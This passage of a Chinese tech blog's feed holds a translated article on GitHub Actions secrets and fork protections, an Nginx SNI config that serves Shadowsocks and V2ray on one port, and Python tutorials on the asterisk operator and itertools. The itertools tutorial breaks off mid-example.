    <content type="html"><![CDATA[<p>昨天我们建立了一个基于<a href="https://qiwihui.com/qiwihui-blog-93/">改变路径</a>触发的工作流; 它的目标是发布文档。如果仔细看，在工作流程的底部，我们引用了一个变量。看起来有点像我们<a href="https://qiwihui.com/qiwihui-blog-85/">引用矩阵变量</a>的方式 ，而这里引用了一个密码。</p><p>在部署场景中，你通常会需要令牌或密码之类的东西──GitHub Actions支持将这些作为密码保存在存储库中。</p><p>要设置密码，请转到“存储库设置”页面，然后选择“密码”。你的密码名称将在你的工作流中用于引用数据，你可以将密码本身放入值中。</p><span id="more"></span><p><img src="https://user-images.githubusercontent.com/3297411/77734745-39523f80-7044-11ea-8aed-91f6dde277e0.png" alt="image"></p><p>要使用该密码，你可以在工作流中使用上下文 <code>secrets</code> 来引用它。如果你有一个密码的名字 <code>SECRET_KEY</code>，你可以将其称为 <code>$&#123;&#123;secret.SECRET_KEY&#125;&#125;</code>。</p><script src="https://gist.github.com/ethomson/eb722482cfd7f955f17c3231efe8804a.js"></script><h2><span id="github-token"><code>GITHUB_TOKEN</code></span></h2><p>GitHub Actions会为每次运行的工作流自动在存储库中设置一个密码 <code>GITHUB_TOKEN</code>。该令牌使你可以与存储库进行交互，而无需自己创建新令牌或设置密码。</p><p>该令牌为你提供了对存储库本身，issue和<a href="https://www.edwardthomson.com/blog/github_actions_9_deploy_to_github_packages.html">GitHub Packages</a>进行读写的有限访问权限。但是它不能完全访问所有内容──你无法与组织中的其他存储库一起使用，也无法发布到GitHub Pages──因此，对于某些工作流，你可能仍需要设置令牌。</p><h2><span id="mi-ma-an-quan">密码安全</span></h2><p>GitHub试图防止你的密码被窥视。在输出日志中，你定义的所有密码都会被清除，并在输出日志之前用星号替换。</p><p><img src="https://user-images.githubusercontent.com/3297411/77734893-7ddddb00-7044-11ea-93af-18ab47df2ffd.png" alt="image"></p><p>这有助于保护你的密码，防止他人窥视，尤其是利用那些导出值的工具。但这当然不是完美的，你应该谨慎保护密码。</p><h2><span id="forks">Forks</span></h2><p>如果你的项目使用fork来接受来自贡献者的pull request（例如，如果你正在开发一个开源项目），则可能对在工作流程中使用密码有所警惕。</p><p>GitHub明确 <strong>禁用</strong> 了对来自fork的工作流提供密码的功能。这意味着，当用户从fork打开对你的项目的pull request时，不会向此工作流提供任何密码。</p><p><img src="https://user-images.githubusercontent.com/3297411/77734903-86361600-7044-11ea-8475-410b7380eb83.png" alt="image"></p><p>这有助于防止用户修改工作流程本身──或工作流程调用的任何脚本──试图获取你的密码副本。这些密码根本无法获得。</p><p>（<code>GITHUB_TOKEN</code>仍然为fork提供了特殊功能，以便它们可以克隆你的存储库（以便构建它），但已将其降级为只读令牌，以防止fork工作流在你的存储库中进行更改。）</p><p>原文链接：<a href="https://www.edwardthomson.com/blog/github_actions_11_secrets.html">https://www.edwardthomson.com/blog/github_actions_11_secrets.html</a></p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3><hr><blockquote><p>from: <a href="https://github.com/qiwihui/blog/issues/94#issuecomment-828274529"><strong>Volcano-Yang</strong></a> on: <strong>4/28/2021</strong></p></blockquote><h2><span id="sha-fa-gan-xie-lou-zhu-de-fan-yi">沙发🛋  感谢楼主的翻译</span></h2><blockquote><p>from: <a href="https://github.com/qiwihui/blog/issues/94#issuecomment-828275735"><strong>Volcano-Yang</strong></a> on: <strong>4/28/2021</strong></p></blockquote><p><img src="https://user-images.githubusercontent.com/43328103/116375203-a173e600-a841-11eb-8535-4212b723be16.png" alt="image">现在还支持设置环境secrets 限制不同分支对secret的读取权限</p>]]></content>
    
    <summary type="html">
    
      GitHub Actions 第11天：密码（Secrets）
    
    </summary>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="翻译" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="tips" scheme="https://qiwihui.com/tags/tips/"/>
    
      <category term="github actions" scheme="https://qiwihui.com/tags/github-actions/"/>
    
  </entry>
  
  <entry>
    <title>Shadowsocks 和 V2ray 共用443端口</title>
    <link href="https://qiwihui.com/qiwihui-blog-104/"/>
    <id>https://qiwihui.com/qiwihui-blog-104/</id>
    <published>2022-08-13T01:54:25.420Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<h2><span id="pei-zhi-guo-cheng">配置过程</span></h2><p>之前部署了 Shadowsocks 和 V2ray 在两台服务器上，最近由于费用增加，于是决定将两个服务合并到同一台服务器上，并保持原来的配置文件不变。此文简单记录。</p><p>Shadowsocks 配置了 simple-obfs 浑下，参数为 <code>obfs=tls</code>。V2ray 使用 nginx + tls + websocket，并使用letsencrypt自动生成 HTTPS 证书。两个均使用不同的域名访问。</p><p>主要的难点在于需要根据不同的域名将流量分发到后端不同的代理上，方法使用 Nginx 基于 SNI 的 4 层转发，即识别 SNI 信息，然后直接转发 TCP/UDP 数据流。使用的模块是 <code>ngx_stream_ssl_preread_module</code>，这个模块在 Nginx 1.11.5 之后才引入，注意开启。</p><span id="more"></span><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">                                     ----&gt; shadowsocks</span><br><span class="line">                                     |</span><br><span class="line">客户端 --[请求]--&gt; Nginx ----[分发]----&gt;</span><br><span class="line">                                     |</span><br><span class="line">                                     ----&gt; v2ray</span><br></pre></td></tr></table></figure><p>为了方便部署，使用 docker-compose 完成整个部署过程，项目地址 <a href="https://github.com/qiwihui/ssv2ray">qiwihui/ssv2ray</a>。</p><p>Nginx 关键配置：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">stream &#123;</span><br><span class="line">    # SNI, domain to config</span><br><span class="line">    map $ssl_preread_server_name $backend_name &#123;</span><br><span class="line">        domain1.com v2fly;</span><br><span class="line">        domain2.com shadowsocks;</span><br><span class="line">        # 因为使用了混淆，所以这里需要填入混淆的域名，比如 www.bing.com</span><br><span class="line">        www.bing.com shadowsocks;</span><br><span class="line">        default v2fly;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # v2ray</span><br><span class="line">    upstream v2fly &#123;</span><br><span class="line">        server nginx-proxy:443;</span><br><span class="line">    &#125;</span><br><span class="line">    upstream v2fly80 &#123;</span><br><span class="line">        server nginx-proxy:80;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # shadowsocks</span><br><span class="line">    upstream shadowsocks &#123;</span><br><span class="line">        server shadowsocks:443;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # 80，这个端口用于自动生成证书</span><br><span class="line">    server &#123;</span><br><span class="line">        listen 80;</span><br><span class="line">        listen [::]:80;</span><br><span class="line">        proxy_pass v2fly80;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        listen 443 reuseport;</span><br><span class="line">        listen [::]:443 reuseport;</span><br><span class="line">        proxy_pass  $backend_name;</span><br><span class="line">        ssl_preread on;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="can-kao">参考</span></h2><ol><li><a href="https://www.chengxiaobai.cn/record/trojan-shared-443-port-scheme.html">Trojan 共用 443 端口方案</a></li></ol><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      Shadowsocks 和 V2ray 共用443端口
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="GFW" scheme="https://qiwihui.com/tags/GFW/"/>
    
  </entry>
  
  <entry>
    <title>19. 星号操作符 — Python 进阶</title>
    <link href="https://qiwihui.com/qiwihui-blog-130/"/>
    <id>https://qiwihui.com/qiwihui-blog-130/</id>
    <published>2022-08-13T01:54:25.420Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>星号（ <code>*</code> ）可用于Python中的不同情况：</p><ul><li>乘法和幂运算</li><li>创建具有重复元素的列表，元组或字符串</li><li><code>*args</code>， <code>**kwargs</code> 和仅关键字参数</li><li>拆包列表/元组/字典的函数参数</li><li>拆包容器</li><li>将可迭代对象合并到列表中/合并字典</li></ul><span id="more"></span><h3><span id="cheng-fa-he-mi-yun-suan">乘法和幂运算</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 乘法</span></span><br><span class="line">result = <span class="number">7</span> * <span class="number">5</span></span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 幂运算</span></span><br><span class="line">result = <span class="number">2</span> ** <span class="number">4</span></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">35</span></span><br><span class="line"><span class="number">16</span></span><br></pre></td></tr></table></figure><h3><span id="chuang-jian-ju-you-chong-fu-yuan-su-de-lie-biao-yuan-zu-huo-zi-fu-chuan">创建具有重复元素的列表，元组或字符串</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># list</span></span><br><span class="line">zeros = [<span class="number">0</span>] * <span class="number">10</span></span><br><span class="line">onetwos = [<span class="number">1</span>, <span class="number">2</span>] * <span class="number">5</span></span><br><span class="line"><span class="built_in">print</span>(zeros)</span><br><span class="line"><span class="built_in">print</span>(onetwos)</span><br><span class="line"></span><br><span class="line"><span class="comment"># tuple</span></span><br><span class="line">zeros = (<span class="number">0</span>,) * <span class="number">10</span></span><br><span class="line">onetwos = (<span class="number">1</span>, <span class="number">2</span>) * <span class="number">5</span></span><br><span class="line"><span class="built_in">print</span>(zeros)</span><br><span class="line"><span class="built_in">print</span>(onetwos)</span><br><span class="line"></span><br><span class="line"><span class="comment"># string</span></span><br><span class="line">A_string = <span class="string">&quot;A&quot;</span> * <span class="number">10</span></span><br><span class="line">AB_string = <span class="string">&quot;AB&quot;</span> * <span class="number">5</span></span><br><span class="line"><span class="built_in">print</span>(A_string)</span><br><span class="line"><span class="built_in">print</span>(AB_string)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line">(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">(<span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">AAAAAAAAAA</span><br><span class="line">ABABABABAB</span><br></pre></td></tr></table></figure><h3><span id="args-kwargs-he-jin-guan-jian-zi-can-shu"><code>*args</code>， <code>**kwargs</code> 和仅关键字参数</span></h3><ul><li>对可变长度参数使用 <code>*args</code></li><li>对长度可变的关键字参数使用 <code>**kwargs</code></li><li>使用 <code>*</code>，后跟更多函数参数以强制使用仅关键字的参数</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">my_function</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">    <span class="keyword">for</span> arg <span class="keyword">in</span> args:</span><br><span class="line">        <span class="built_in">print</span>(arg)</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> kwargs:</span><br><span class="line">        <span class="built_in">print</span>(key, kwargs[key])</span><br><span class="line">        </span><br><span class="line">my_function(<span class="string">&quot;Hey&quot;</span>, <span class="number">3</span>, [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>], name=<span class="string">&quot;Alex&quot;</span>, age=<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x27;*&#x27; 或 &#x27;* identifier&#x27; 之后的参数是仅关键字参数，只能使用关键字参数传递。</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_function2</span>(<span class="params">name, *, age</span>):</span><br><span class="line">    <span class="built_in">print</span>(name)</span><br><span class="line">    <span class="built_in">print</span>(age)</span><br><span class="line"></span><br><span class="line"><span class="comment"># my_function2(&quot;Michael&quot;, 5) --&gt; 这会引发 TypeError 错误</span></span><br><span class="line">my_function2(<span class="string">&quot;Michael&quot;</span>, age=<span class="number">5</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Hey</span><br><span class="line"><span class="number">3</span></span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line">name Alex</span><br><span class="line">age <span class="number">8</span></span><br><span class="line">Michael</span><br><span class="line"><span class="number">5</span></span><br></pre></td></tr></table></figure><h3><span id="chai-bao-han-shu-can-shu">拆包函数参数</span></h3><ul><li>如果长度与参数匹配，则列表/元组/集合/字符串可以用 <code>*</code> 拆成函数参数。</li><li>如果长度和键与参数匹配，则字典可以用两个 <code>**</code> 拆包。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">a, b, c</span>):</span><br><span class="line">    <span class="built_in">print</span>(a, b, c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 长度必需匹配</span></span><br><span class="line">my_list = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">foo(*my_list)</span><br><span class="line"></span><br><span class="line">my_string = <span class="string">&quot;ABC&quot;</span></span><br><span class="line">foo(*my_string)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 长度和键必需匹配</span></span><br><span class="line">my_dict = &#123;<span class="string">&#x27;a&#x27;</span>: <span class="number">4</span>, <span class="string">&#x27;b&#x27;</span>: <span class="number">5</span>, <span class="string">&#x27;c&#x27;</span>: <span class="number">6</span>&#125;</span><br><span class="line">foo(**my_dict)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span></span><br><span class="line">A B C</span><br><span class="line"><span class="number">4</span> <span class="number">5</span> <span class="number">6</span></span><br></pre></td></tr></table></figure><h3><span id="chai-bao-rong-qi">拆包容器</span></h3><p>将列表，元组或集合的元素拆包为单个和多个剩余元素。 请注意，即使被拆包的容器是元组或集合，也将多个元素组合在一个列表中。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">numbers = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">*beginning, last = numbers</span><br><span class="line"><span class="built_in">print</span>(beginning)</span><br><span class="line"><span class="built_in">print</span>(last)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">first, *end = numbers</span><br><span class="line"><span class="built_in">print</span>(first)</span><br><span class="line"><span class="built_in">print</span>(end)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line">first, *middle, last = numbers</span><br><span class="line"><span class="built_in">print</span>(first)</span><br><span class="line"><span class="built_in">print</span>(middle)</span><br><span class="line"><span class="built_in">print</span>(last)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>]</span><br><span class="line"><span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span></span><br><span class="line">[<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>]</span><br><span class="line"></span><br><span class="line"><span class="number">1</span></span><br><span class="line">[<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>]</span><br><span class="line"><span class="number">8</span></span><br></pre></td></tr></table></figure><h3><span id="jiang-ke-die-dai-dui-xiang-he-bing-dao-lie-biao-zhong-he-bing-zi-dian">将可迭代对象合并到列表中/合并字典</span></h3><p>由于PEP 448（<a href="https://www.python.org/dev/peps/pep-0448/">https://www.python.org/dev/peps/pep-0448/</a>），从Python 3.5开始，这是可能的。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将可迭代对象合并到列表中</span></span><br><span class="line">my_tuple = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">my_set = &#123;<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125;</span><br><span class="line">my_list = [*my_tuple, *my_set]</span><br><span class="line"><span class="built_in">print</span>(my_list)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用字典拆包合并两个字典</span></span><br><span class="line">dict_a = &#123;<span class="string">&#x27;one&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;two&#x27;</span>: <span class="number">2</span>&#125;</span><br><span class="line">dict_b = &#123;<span class="string">&#x27;three&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;four&#x27;</span>: <span class="number">4</span>&#125;</span><br><span class="line">dict_c = &#123;**dict_a, **dict_b&#125;</span><br><span class="line"><span class="built_in">print</span>(dict_c)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line">&#123;<span class="string">&#x27;one&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;two&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;three&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;four&#x27;</span>: <span class="number">4</span>&#125;</span><br></pre></td></tr></table></figure><p>但是，请注意以下合并解决方案。 如果字典中有任何非字符串键，则它将不起作用：<a href="https://stackoverflow.com/questions/38987/how-to-merge-two-dictionaries-in-a-single-expression/39858#39858">https://stackoverflow.com/questions/38987/how-to-merge-two-dictionaries-in-a-single-expression/39858#39858</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dict_a = &#123;<span class="string">&#x27;one&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;two&#x27;</span>: <span class="number">2</span>&#125;</span><br><span class="line">dict_b = &#123;<span class="number">3</span>: <span class="number">3</span>, <span class="string">&#x27;four&#x27;</span>: <span class="number">4</span>&#125;</span><br><span class="line">dict_c = <span class="built_in">dict</span>(dict_a, **dict_b)</span><br><span class="line"><span class="built_in">print</span>(dict_c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 以下可行:</span></span><br><span class="line"><span class="comment"># dict_c = &#123;**dict_a, **dict_b&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">---------------------------------------------------------------------------</span><br><span class="line">    TypeError                                 Traceback (most recent call last)</span><br><span class="line">    &lt;ipython-<span class="built_in">input</span>-<span class="number">52</span>-2660fb90a60f&gt; <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">          <span class="number">1</span> dict_a = &#123;<span class="string">&#x27;one&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;two&#x27;</span>: <span class="number">2</span>&#125;</span><br><span class="line">          <span class="number">2</span> dict_b = &#123;<span class="number">3</span>: <span class="number">3</span>, <span class="string">&#x27;four&#x27;</span>: <span class="number">4</span>&#125;</span><br><span class="line">    ----&gt; <span class="number">3</span> dict_c = <span class="built_in">dict</span>(dict_a, **dict_b)</span><br><span class="line">          <span class="number">4</span> <span class="built_in">print</span>(dict_c)</span><br><span class="line">          <span class="number">5</span> </span><br><span class="line">    TypeError: keywords must be strings</span><br></pre></td></tr></table></figure><p>推荐进一步阅读：</p><ul><li><a href="https://treyhunner.com/2018/10/asterisks-in-python-what-they-are-and-how-to-use-them/">https://treyhunner.com/2018/10/asterisks-in-python-what-they-are-and-how-to-use-them/</a></li><li><a href="https://treyhunner.com/2016/02/how-to-merge-dictionaries-in-python/">https://treyhunner.com/2016/02/how-to-merge-dictionaries-in-python/</a></li></ul><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      19. 星号操作符 — Python 进阶
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>07. Itertools — Python 进阶</title>
    <link href="https://qiwihui.com/qiwihui-blog-124/"/>
    <id>https://qiwihui.com/qiwihui-blog-124/</id>
    <published>2022-08-13T01:54:25.320Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>Python <code>itertools</code> 模块是用于处理迭代器的工具集合。 简而言之，迭代器是可以在for循环中使用的数据类型。 Python中最常见的迭代器是列表。</p><p>有关所有可能的 itertools，请参见 <a href="https://docs.python.org/3/library/itertools.html">https://docs.python.org/3/library/itertools.html</a>。</p><span id="more"></span><h3><span id="product">product()</span></h3><p>该工具计算输入可迭代项的笛卡尔积。</p><p>它等效于嵌套的for循环。 例如，<code>product(A, B)</code>返 回的结果与 <code>((x,y) for x in A for y in B)</code> 相同。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"></span><br><span class="line">prod = product([<span class="number">1</span>, <span class="number">2</span>], [<span class="number">3</span>, <span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(prod)) <span class="comment"># 请注意，我们将迭代器转换为列表进行打印</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 为了允许可迭代对象自身做乘积，指定重复次数</span></span><br><span class="line">prod = product([<span class="number">1</span>, <span class="number">2</span>], [<span class="number">3</span>], repeat=<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(prod)) <span class="comment"># 请注意，我们将迭代器转换为列表进行打印</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[(<span class="number">1</span>, <span class="number">3</span>), (<span class="number">1</span>, <span class="number">4</span>), (<span class="number">2</span>, <span class="number">3</span>), (<span class="number">2</span>, <span class="number">4</span>)]</span><br><span class="line">[(<span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">3</span>), (<span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">3</span>), (<span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">3</span>), (<span class="number">2</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">3</span>)]</span><br></pre></td></tr></table></figure><h3><span id="permutations">permutations()</span></h3><p>此工具以所有可能的顺序，以可迭代的方式返回元素的连续长度排列，并且没有重复的元素。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> permutations</span><br><span class="line"></span><br><span class="line">perm = permutations([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(perm))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可选：排列元组的长度</span></span><br><span class="line">perm = permutations([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(perm))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>), (<span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>), (<span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>), (<span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>), (<span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>), (<span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>)]</span><br><span class="line">[(<span class="number">1</span>, <span class="number">2</span>), (<span class="number">1</span>, <span class="number">3</span>), (<span class="number">2</span>, <span class="number">1</span>), (<span class="number">2</span>, <span class="number">3</span>), (<span class="number">3</span>, <span class="number">1</span>), (<span class="number">3</span>, <span class="number">2</span>)]</span><br></pre></td></tr></table></figure><h3><span id="combinations-and-combinations-with-replacement">combinations() and combinations_with_replacement()</span></h3><p>长度r的元组，按排序顺序。 因此，如果对输入的可迭代对象进行排序，则将按排序顺序生成组合元组。 <code>combinations()</code>不允许重复的元素，但  <code>combinations_with_replacement()</code> 允许。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> combinations, combinations_with_replacement</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二个参数是必需的，它指定输出元组的长度。</span></span><br><span class="line">comb = combinations([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>], <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(comb))</span><br><span class="line"></span><br><span class="line">comb = combinations_with_replacement([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>], <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(comb))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[(<span class="number">1</span>, <span class="number">2</span>), (<span class="number">1</span>, <span class="number">3</span>), (<span class="number">1</span>, <span class="number">4</span>), (<span class="number">2</span>, <span class="number">3</span>), (<span class="number">2</span>, <span class="number">4</span>), (<span class="number">3</span>, <span class="number">4</span>)]</span><br><span class="line">[(<span class="number">1</span>, <span class="number">1</span>), (<span class="number">1</span>, <span class="number">2</span>), (<span class="number">1</span>, <span class="number">3</span>), (<span class="number">1</span>, <span class="number">4</span>), (<span class="number">2</span>, <span class="number">2</span>), (<span class="number">2</span>, <span class="number">3</span>), (<span class="number">2</span>, <span class="number">4</span>), (<span class="number">3</span>, <span class="number">3</span>), (<span class="number">3</span>, <span class="number">4</span>), (<span class="number">4</span>, <span class="number">4</span>)]</span><br></pre></td></tr></table></figure><h3><span id="accumulate">accumulate()</span></h3><p>使迭代器返回累加的总和或其他二进制函数的累加结果。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> accumulate</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回累积和</span></span><br><span class="line">acc = accumulate([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(acc))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 其他可能的函数是可能的</span></span><br><span class="line"><span class="keyword">import</span> operator</span><br><span class="line">acc = accumulate([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>], func=operator.mul)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(acc))</span><br><span class="line"></span><br><span class="line">acc = accumulate([<span class="number">1</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">4</span>], func=<span class="built_in">max</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(acc))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">10</span>]</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">24</span>]</span><br><span class="line">[<span class="number">1</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>]</span><br></pre></td></tr></table></figure><h3><span id="groupby">groupby()</span></h3><p>创建一个迭代器，从迭代器返回连续的键和组。 键是为每个元素计算键值的函数。 如果未指定或为None，则键默认为标识函数，并返回不变的元素。 通常，可迭代项需要已经在相同的键函数上进行了排序。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> groupby</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用函数作为键</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">smaller_than_3</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x &lt; <span 